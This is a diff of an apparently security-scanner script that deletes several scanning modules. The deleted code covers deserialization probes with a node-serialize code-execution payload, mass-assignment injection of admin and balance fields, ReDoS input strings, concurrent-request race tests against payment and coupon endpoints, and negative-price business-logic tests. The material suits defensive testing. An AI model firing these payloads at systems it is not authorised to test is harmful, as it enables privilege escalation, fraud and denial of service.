-                         "deserial", ep_url, "A08:2021", "CWE-502",
-                         "PHP deserialization payload caused delay → potential blind object injection.",
-                         f"PHP gadget → {time.time()-t0:.1f}s delay",
-                         7.5, f"PHP blind deserial timing at {ep}")
-            except Exception:
-                pass
-
-    # Probe 4: Python pickle detection
-    try:
-        # Detect pickle-serialized cookies or headers
-        r = rget(url)
-        for ck_name, ck_val in r.cookies.items():
-            try:
-                raw_ck = _b64.b64decode(ck_val + "==")
-                if raw_ck[:2] in (b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05"):
-                    _add("Python Pickle in Cookie", "Critical",
-                         "deserial", url, "A08:2021", "CWE-502",
-                         f"Cookie '{ck_name}' appears to be a Python pickle object "
-                         f"(magic bytes: {raw_ck[:2].hex()}). Arbitrary code execution on deserialize.",
-                         f"Cookie {ck_name}=base64({raw_ck[:8].hex()}...) → pickle magic bytes",
-                         9.8, f"Pickle cookie: {ck_name}")
-            except Exception:
-                pass
-    except ImportError:
-        pass
-
-    # Probe 5: Node.js node-serialize
-    node_payload = '{"rce":"_$$ND_FUNC$$_function(){return 1}()"}'
-    node_endpoints = ["/api", "/api/v1", "/json", "/data"]
-    for ep in node_endpoints[:2]:
-        ep_url = url.rstrip("/") + ep
-        try:
-            r = rpost(ep_url, data=node_payload,
-                      headers={"Content-Type": "application/json"})
-            body = r.text
-            if "$$ND_FUNC$$" in body or '"rce":1' in body or '"rce":"1"' in body:
-                _add("Node.js node-serialize IIFE Reflected", "Critical",
-                     "deserial", ep_url, "A08:2021", "CWE-502",
-                     "node-serialize IIFE function payload reflected or executed → "
-                     "Remote Code Execution via Node.js deserialization.",
-                     f"POST $$ND_FUNC$$ payload → reflected/executed in response",
-                     9.8, f"node-serialize probe at {ep}")
-        except Exception:
-            pass
-
-    _module_done("deserial")
-
-
-# ═══════════════════════════════════════════════════════════════
-#  MODULE 39 — API Security (Mass Assignment + Versioning)
 # ═══════════════════════════════════════════════════════════════
 def api_security_scan(url):
     if _module_skip("api_sec"): return
@@ -8913,89 +8825,6 @@ def cloud_bucket_scan(url):
 # ═══════════════════════════════════════════════════════════════════════
 #  MODULE 60 — MASS ASSIGNMENT
 # ═══════════════════════════════════════════════════════════════════════
-def mass_assignment_scan(url):
-    if _module_skip("mass_assignment"): return
-    section("MODULE 60 — MASS ASSIGNMENT","📦")
-
-    parsed = urlparse(url)
-    base   = f"{parsed.scheme}://{parsed.netloc}"
-
-    # API endpoints that commonly accept JSON bodies
-    API_ENDPOINTS = [
-        "/api/users", "/api/user", "/api/account", "/api/profile",
-        "/api/register", "/api/signup", "/api/update",
-        "/users", "/user/update", "/account/update",
-        "/api/v1/users", "/api/v2/users",
-    ]
-
-    # Privileged fields to inject
-    PRIV_FIELDS = [
-        ("isAdmin",    True),
-        ("is_admin",   True),
-        ("admin",      True),
-        ("role",       "admin"),
-        ("roles",      ["admin"]),
-        ("permission", "admin"),
-        ("privileged", True),
-        ("superuser",  True),
-        ("is_staff",   True),
-        ("verified",   True),
-        ("status",     "active"),
-        ("balance",    999999),
-        ("credits",    999999),
-    ]
-
-    for ep in API_ENDPOINTS:
-        ep_url = base + ep
-        try:
-            # First, probe if endpoint exists
-            probe = rget(ep_url, allow_redirects=False, timeout=TIMEOUT)
-            if probe.status_code not in (200, 201, 400, 401, 403, 405, 422):
-                continue
-
-            # Try POST with privileged fields
-            for field_name, field_val in PRIV_FIELDS[:5]:
-                try:
-                    payload = {"username": "test", "email": "test@example.com",
-                               "password": "Test@123!", field_name: field_val}
-                    r = rpost(ep_url, json=payload, timeout=TIMEOUT)
-                    if r.status_code in (200, 201):
-                        try:
-                            resp = r.json()
-                            # Check if the privileged field was reflected back (accepted)
-                            if isinstance(resp, dict):
-                                if field_name in str(resp).lower() or str(field_val).lower() in str(resp).lower():
-                                    vuln(f"Mass assignment: field '{field_name}' accepted at {ep}", "High")
-                                    add("mass_assignment", {
-                                        "severity": "High",
-                                        "confirmed": True,
-                                        "title": f"Mass Assignment — Privileged Field '{field_name}' Accepted",
-                                        "description": f"POST to {ep_url} with field '{field_name}={field_val}' returned 200/201 and reflected the privileged field. Attackers may be able to elevate privileges.",
-                                        "recommendation": "Use allowlists (never denylists) to whitelist only expected fields. Use separate DTOs for user input.",
-                                        "url": ep_url,
-                                        "evidence": f"POST {{{field_name}: {field_val}}} → 200 | Response contains field: {str(resp)[:200]}",
-                                    })
-                        except Exception: pass
-                    elif r.status_code == 200 and field_name in r.text:
-                        add("mass_assignment", {
-                            "severity": "Medium",
-                            "confirmed": False,
-                            "title": f"Potential Mass Assignment — Field '{field_name}' Reflected",
-                            "description": f"POST to {ep_url} with '{field_name}' field — the field name appears in the response. Manual verification needed.",
-                            "recommendation": "Use allowlists for accepted fields. Never bind user input directly to model objects.",
-                            "url": ep_url,
-                            "evidence": f"Field '{field_name}' found in response body",
-                        })
-                except Exception: pass
-        except Exception: pass
-
-    good("Mass assignment scan complete")
-    _module_done("mass_assignment")
-
-
-# ═══════════════════════════════════════════════════════════════════════
-#  MODULE 61 — ACCOUNT TAKEOVER VECTORS
-# ═══════════════════════════════════════════════════════════════════════
 def account_takeover_scan(url):
     if _module_skip("acct_takeover"): return
     section("MODULE 61 — ACCOUNT TAKEOVER VECTORS","🔐")
@@ -9120,105 +8949,6 @@ def account_takeover_scan(url):
 
 # ═══════════════════════════════════════════════════════════════════════
 #  MODULE 62 — ReDoS (Regular Expression Denial of Service)
-# ═══════════════════════════════════════════════════════════════════════
-def redos_scan(url):
-    if _module_skip("redos"): return
-    section("MODULE 62 — REGEX DOS (ReDoS)","⏱️")
-
-    parsed = urlparse(url)
-    params = parse_qs(parsed.query)
-    if not params:
-        params = {"email": ["test@example.com"], "search": ["test"],
-                  "phone": ["1234567890"], "username": ["testuser"]}
-
-    # ReDoS payloads targeting common vulnerable regexes
-    REDOS_PAYLOADS = {
-        "email": [
-            "a" * 30 + "@" + "a" * 30 + "." + "a" * 30,
-            "aaa@aaa." + "a" * 50,
-            "a@" + "." * 50 + "com",
-        ],
-        "phone": [
-            "1" * 50 + "!",
-            "+1" + "1" * 48,
-        ],
-        "username": [
-            "a" * 50 + "!",
-            "aA" * 25 + "!",
-        ],
-        "search": [
-            "a" * 100,
-            "<" + "a" * 50 + ">",
-        ],
-        "generic": [
-            "a" * 50 + "!",
-            ("a?" * 25) + ("a" * 25),
-        ],
-    }
-
-    # Measure baseline
-    try:
-        t0 = time.time()
-        rget(url, timeout=TIMEOUT)
-        baseline = time.time() - t0
-    except Exception:
-        baseline = 1.0
-
-    for param in list(params.keys())[:4]:
-        # Choose payloads based on param name
-        param_lower = param.lower()
-        if "email" in param_lower:
-            payloads = REDOS_PAYLOADS["email"]
-        elif "phone" in param_lower:
-            payloads = REDOS_PAYLOADS["phone"]
-        elif "user" in param_lower or "name" in param_lower:
-            payloads = REDOS_PAYLOADS["username"]
-        elif "search" in param_lower or "query" in param_lower or "q" == param_lower:
-            payloads = REDOS_PAYLOADS["search"]
-        else:
-            payloads = REDOS_PAYLOADS["generic"]
-
-        for payload in payloads:
-            try:
-                tp = dict(params); tp[param] = [payload]
-                test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
-                t0 = time.time()
-                r = rget(test_url, timeout=max(TIMEOUT, baseline + 10))
-                elapsed = time.time() - t0
-                delay = elapsed - baseline
-                if delay > 3.0:
-                    vuln(f"ReDoS CONFIRMED param='{param}' delay={elapsed:.1f}s (baseline={baseline:.1f}s)", "High")
-                    add("redos", {
-                        "severity": "High",
-                        "confirmed": True,
-                        "title": f"ReDoS (Regex Denial of Service) CONFIRMED — Parameter '{param}'",
-                        "description": f"CONFIRMED: Parameter '{param}' caused {delay:.1f}s delay above baseline with crafted input. Indicates vulnerable regex processing that can be exploited for DoS.",
-                        "recommendation": "Audit all regex patterns. Avoid catastrophic backtracking patterns like (a+)+ or (a|aa)+. Use regex timeout/atomic groups.",
-                        "url": test_url,
-                        "evidence": f"Payload length {len(payload)} chars → {elapsed:.2f}s response (baseline {baseline:.2f}s, delta +{delay:.2f}s)",
-                    })
-                    break
-            except requests.exceptions.Timeout:
-                vuln(f"ReDoS CONFIRMED (timeout) param='{param}'", "High")
-                tp2 = dict(params); tp2[param] = [payload]
-                add("redos", {
-                    "severity": "High",
-                    "confirmed": True,
-                    "title": f"ReDoS CONFIRMED (Server Timeout) — Parameter '{param}'",
-                    "description": f"CONFIRMED: Parameter '{param}' caused server timeout with ReDoS payload. Server-side regex is vulnerable to catastrophic backtracking.",
-                    "recommendation": "Replace vulnerable regex with safe alternatives. Add timeout for regex evaluation.",
-                    "url": parsed._replace(query=urlencode(tp2, doseq=True)).geturl(),
-                    "evidence": f"Server timed out processing ReDoS payload for param '{param}'",
-                })
-                break
-            except Exception: pass
-
-    good("ReDoS scan complete")
-    _module_done("redos")
-
-
-# ═══════════════════════════════════════════════════════════════════════
-#  MODULE 63 — CLICKJACKING
 # ═══════════════════════════════════════════════════════════════════════
 def clickjacking_scan(url):
     if _module_skip("clickjacking"): return
@@ -9799,94 +9529,6 @@ def param_discovery_scan(url):
 
 # ═══════════════════════════════════════════════════════════════════════
 #  MODULE 71 — RACE CONDITION TESTING
-# ═══════════════════════════════════════════════════════════════════════
-def race_condition_scan(url):
-    if _module_skip("race_condition"): return
-    section("MODULE 71 — RACE CONDITION TESTING","🏁")
-
-    parsed = urlparse(url)
-    base   = f"{parsed.scheme}://{parsed.netloc}"
-
-    # Find race-condition-prone endpoints
-    RACE_ENDPOINTS = [
-        # Payment/Transaction
-        ("/api/checkout",      "POST", {"amount": "10", "item_id": "1"}),
-        ("/api/purchase",      "POST", {"product_id": "1", "quantity": "1"}),
-        ("/api/payment",       "POST", {"amount": "10"}),
-        ("/api/transfer",      "POST", {"amount": "100", "to": "user2"}),
-        # Coupon/Discount
-        ("/api/coupon/apply",  "POST", {"code": "SAVE10"}),
-        ("/api/discount",      "POST", {"code": "DISCOUNT10"}),
-        ("/api/voucher",       "POST", {"code": "VOUCHER10"}),
-        # Like/Vote (should be single-use)
-        ("/api/like",          "POST", {"post_id": "1"}),
-        ("/api/vote",          "POST", {"option_id": "1"}),
-        ("/api/react",         "POST", {"item_id": "1", "type": "like"}),
-        # Referral/Bonus
-        ("/api/referral",      "POST", {"code": "REF123"}),
-        ("/api/bonus",         "POST", {"type": "daily"}),
-    ]
-
-    for ep, method, data in RACE_ENDPOINTS:
-        ep_url = base + ep
-        try:
-            # First probe the endpoint
-            probe = rget(ep_url, allow_redirects=False, timeout=4)
-            if probe.status_code not in (200, 201, 400, 401, 403, 405, 422):
-                continue
-
-            # Race condition test: send 10 simultaneous requests
-            results = []
-            lock = threading.Lock()
-
-            def _race_req():
-                try:
-                    r = rpost(ep_url, json=data, timeout=5)
-                    with lock:
-                        results.append((r.status_code, r.text[:200]))
-                except Exception: pass
-
-            # Synchronize start for maximum concurrency
-            ready = threading.Barrier(10, timeout=5)
-            threads = []
-            for _ in range(10):
-                def _t():
-                    try: ready.wait()
-                    except Exception: pass
-                    _race_req()
-                t = threading.Thread(target=_t)
-                t.daemon = True
-                threads.append(t)
-
-            for t in threads: t.start()
-            for t in threads: t.join(timeout=8)
-
-            if len(results) >= 2:
-                success_count = sum(1 for status, body in results
-                                    if status in (200, 201) and
-                                    any(x in body.lower() for x in
-                                        ["success","applied","ok","true","accepted","created"]))
-
-                if success_count >= 2:
-                    vuln(f"Race condition CONFIRMED at {ep} — {success_count}/10 concurrent requests succeeded", "High")
-                    add("race_condition", {
-                        "severity": "High",
-                        "confirmed": True,
-                        "title": f"Race Condition CONFIRMED — {ep}",
-                        "description": f"CONFIRMED: {success_count} out of 10 simultaneous requests to {ep_url} succeeded concurrently. This indicates insufficient atomicity in the operation — attackers can abuse this to apply coupons multiple times, transfer more than available balance, or trigger duplicate actions.",
-                        "recommendation": "Use database transactions with proper isolation level (SERIALIZABLE). Implement optimistic locking. Use atomic compare-and-swap operations. Redis distributed locks for critical sections.",
-                        "url": ep_url,
-                        "evidence": f"{success_count}/10 concurrent requests returned success status",
-                    })
-
-        except Exception: pass
-
-    good("Race condition scan complete")
-    _module_done("race_condition")
-
-
-# ═══════════════════════════════════════════════════════════════════════
-#  WAF BYPASS SCAN
 # ═══════════════════════════════════════════════════════════════════════
 def waf_bypass_scan(url):
     """Test WAF bypass techniques — if WAF detected, try to find bypasses."""
@@ -13638,104 +13280,6 @@ def null_byte_injection_scan(url):
 
 
 # ═══ MODULE 120 — BUSINESS LOGIC FLAWS (v14.0) ════════════════════
-def business_logic_scan(url):
-    """MODULE 120 — Business logic flaw detection (price, qty, workflow)."""
-    if _module_skip("biz_logic_adv"):
-        info("Skipping Business Logic (already done)"); return
-    section("MODULE 120 — BUSINESS LOGIC FLAWS","🏦")
-    parsed = _up(url)
-    base   = f"{parsed.scheme}://{parsed.netloc}"
-    found  = False
-    # Test price/quantity manipulation endpoints
-    shop_endpoints = [
-        "/cart","/checkout","/order","/api/cart","/api/order","/shop/cart",
-        "/store/cart","/buy","/purchase","/payment","/basket",
-    ]
-    # Price manipulation payloads
-    price_payloads = [
-        {"price": "-1"},
-        {"price": "0"},
-        {"price": "0.01"},
-        {"amount": "-1"},
-        {"total": "-100"},
-        {"cost": "0"},
-        {"quantity": "0"},
-        {"quantity": "-1"},
-        {"qty": "99999999"},
-        {"discount": "100"},
-        {"coupon_percent": "100"},
-    ]
-    for path in shop_endpoints:
-        ep = base + path
-        try:
-            r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
-            if r.status_code not in (200, 302, 405):
-                continue
-            info(f"  Business Logic: found endpoint {ep}")
-            for payload in price_payloads:
-                try:
-                    pr = SESSION.post(ep, json=payload, timeout=TIMEOUT, verify=False)
-                    resp_l = pr.text.lower()
-                    # Success signs — accepted invalid values
-                    if pr.status_code in (200,201) and any(s in resp_l for s in
-                            ["success","added","cart","order","accepted","ok","true"]):
-                        add("biz_logic_adv", {
-                            "type": "Business Logic — Price/Qty Manipulation",
-                            "severity": "High",
-                            "url": ep,
-                            "payload": payload,
-                            "detail": f"Server accepted invalid business values {payload} at {ep} — may allow free or negative-price purchases",
-                            "remediation": (
-                                "1. Validate all business values server-side\n"
-                                "2. Never trust client-sent price/quantity values\n"
-                                "3. Recalculate totals from server-side data\n"
-                                "4. Set minimum/maximum bounds for all numeric inputs\n"
-                                "5. Log and alert on anomalous transaction values"),
-                        })
-                        vuln(f"Business Logic Flaw at {ep} — accepted {payload}", "High")
-                        found = True
-                        break
-                except Exception:
-                    pass
-        except Exception:
-            pass
-
-    # Test workflow bypass — accessing step N+1 without step N
-    workflow_steps = [
-        ("/checkout/step1","/checkout/step3"),
-        ("/checkout/payment","/checkout/confirm"),
-        ("/signup/step1","/signup/complete"),
-        ("/order/review","/order/complete"),
-    ]
-    for step1, step3 in workflow_steps:
-        try:
-            # Skip step 1, go directly to step 3
-            r = SESSION.get(base+step3, timeout=TIMEOUT, verify=False)
-            if r.status_code == 200 and "step" not in r.url.lower().replace(step3,""):
-                # We reached step 3 without going through step 1
-                resp_l = r.text.lower()
-                if any(s in resp_l for s in ["confirm","complete","place order","submit","payment"]):
-                    add("biz_logic_adv", {
-                        "type": "Workflow Bypass",
-                        "severity": "High",
-                        "url": base+step3,
-                        "detail": f"Direct access to {step3} without completing {step1} — multi-step workflow can be bypassed",
-                        "remediation": (
-                            "1. Validate workflow state server-side before each step\n"
-                            "2. Use server-side session to track completed steps\n"
-                            "3. Redirect to step 1 if previous steps not completed"),
-                    })
-                    vuln(f"Workflow Bypass: {step3} accessible without {step1}", "High")
-                    found = True
-        except Exception:
-            pass
-
-    if not found:
-        good("Business Logic: No business logic flaws detected")
-    _module_done("biz_logic_adv")
-
-
-# ═══ MODULE 121 — JSON INJECTION (v14.0) ══════════════════════════
 def json_injection_scan(url):
     """MODULE 121 — JSON injection and parameter pollution."""
     if _module_skip("json_inject"):
